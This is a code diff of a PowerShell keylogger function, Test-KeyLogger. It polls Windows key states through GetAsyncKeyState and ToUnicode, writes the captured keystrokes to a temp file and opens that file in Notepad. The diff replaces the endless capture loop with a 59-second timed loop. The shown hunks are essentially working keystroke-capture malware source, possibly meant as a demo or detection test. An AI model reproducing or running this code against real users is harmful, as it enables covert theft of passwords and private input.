@@ -1,4 +1,5 @@
-function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt") 
+function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt")
+
 {
   # API declaration
   $APIsignatures = @'
@@ -17,15 +18,18 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   $no_output = New-Item -Path $logPath -ItemType File -Force
 
   try
+  
+  
   {
-    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
-
-    while ($true) {
+    $timer = [Diagnostics.Stopwatch]::StartNew()
+    While($timer.Elapsed.Seconds -lt 59) {
+      Write-Host $timer.Elapsed.TotalSeconds
       Start-Sleep -Milliseconds 40            
       for ($ascii = 9; $ascii -le 254; $ascii++) {
         # get key state
         $keystate = $API::GetAsyncKeyState($ascii)
         # if key pressed
+        
         if ($keystate -eq -32767) {
           $null = [console]::CapsLock
           # translate code
@@ -34,7 +38,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
           $loggedchar = New-Object -TypeName System.Text.StringBuilder
-
+          
           # translate virtual key          
           if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
           {
@@ -45,9 +49,10 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
     }
   }
+  
   finally
   {    
-    notepad $logPath
+     notepad $logPath
   }
 }
 
